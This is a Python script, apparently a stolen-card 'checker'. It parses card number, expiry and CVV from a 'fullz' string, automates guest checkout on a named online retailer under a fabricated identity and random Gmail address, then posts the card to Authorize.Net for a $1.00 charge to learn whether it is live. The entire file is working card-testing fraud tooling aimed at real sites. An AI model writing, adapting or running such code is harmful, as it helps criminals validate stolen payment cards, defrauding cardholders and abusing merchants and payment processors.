import asyncio
import requests
from fake_useragent import UserAgent
import re
from FUNC.defs import *
import json
import base64
import random
from bs4 import BeautifulSoup
import time



def extract_string(s, start, end):
    """Extract a substring between two delimiters."""
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_braintree_auth(fullz, session):
    try:
        
        cc, mes, ano, cvv = fullz.split("|")
        
        
        user = f"cristniki{random.randint(9999, 574545)}"
        mail = f"{user}@gmail.com"

        
        session = requests.Session()
        
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://shop.grangesupply.com',
            'Referer': 'https://shop.grangesupply.com/departments/tie-and-twine-%7CF%7CF09%7CFF0921.html',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'cart_qty[1]': '1',
            'mode': 'addtocart',
            'addsingle': 'true',
            'cart_product[1]': '5231',
            'cart_partno[1]': '70531',
            'product': '5231',
            'addtocarttype': 'ajax',
        }

        response = session.post('https://shop.grangesupply.com/inet/storefront/store.php/', headers=headers, data=data)
        #print(response.text)

        

        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://shop.grangesupply.com',
            'Referer': 'https://shop.grangesupply.com/inet/storefront/store.php?mode=checkout&action=address',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'mode': 'set_address',
            'new_user[language]': 'en',
            'skip_account': 'Y',
            'new_user[first_name]': 'Butto',
            'new_user[last_name]': 'baby',
            'new_user[email]': mail,  # Use generated email
            'new_user[phone]': '2016383892',
            'new_user[address1]': '123 Allen Street',
            'new_user[address2]': '',
            'new_user[city]': 'New York',
            'new_user_country': 'US',
            'new_user_province': 'WA',
            'new_user[postal]': '10001',
            'new_user[company]': 'None',
            'address_type': 'pickup',
            'pickup_date': '2029-05-04',
            'pickup_time': '9:30am',
        }

        response = session.post('https://shop.grangesupply.com/inet/storefront/store.php', headers=headers, data=data)
        #print(response.text)

        


        
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://shop.grangesupply.com',
            'Referer': 'https://shop.grangesupply.com/inet/storefront/store.php?mode=checkout&action=shipping',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data = {
            'inet_gateway': 'authorizenetaccept',
            'mode': 'process_checkout',
            'ach': 'N',
        }

        response = session.post(
            'https://shop.grangesupply.com/inet/storefront/paypage_redirect.php',
            headers=headers,
            data=data,
        )

        data = json.loads(response.content)
        token = data['token']
        #print(token)
        #print(response.text)

        

        #print(response.text)

        
        headers = {
            'authority': 'accept.authorize.net',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://accept.authorize.net',
            'referer': 'https://accept.authorize.net/payment/payment',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'token': token,
            'totalAmount': '1.00',
            'paymentMethod': 'cc',
            'creditCard': cc,
            'expirationDate': f"{mes}/{ano}",  
            'cardCode': cvv,
        }

        response = session.post('https://accept.authorize.net/Payment/Api.ashx', headers=headers, data=data)
        

        return response.text

    except Exception as e:
        return str(e)

